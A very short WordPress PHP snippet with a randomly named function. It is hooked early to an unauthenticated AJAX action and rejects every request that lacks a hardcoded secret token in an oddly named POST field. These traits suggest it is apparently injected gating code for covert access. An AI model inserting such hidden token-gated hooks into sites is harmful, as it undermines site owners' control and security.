<?php

function software_instant_ip() {
	if (!isset($_POST["jrsuplmrwaos"]) || $_POST["jrsuplmrwaos"] !== "uehhW1b9") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'software_instant_ip', 5, 1);
